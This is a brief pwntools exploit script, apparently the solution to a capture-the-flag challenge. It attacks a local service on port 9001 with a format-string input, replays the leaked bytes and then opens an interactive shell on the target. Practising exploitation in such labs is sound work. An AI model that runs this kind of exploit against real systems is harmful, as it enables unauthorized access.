#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
elf = ELF("./task_patched")
context.binary = elf
context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("127.0.0.1", 9001)

p.sendline(b"%s")
p.send(p.recv(0x64)[:32])

p.sendline(b"whoami")
p.interactive()
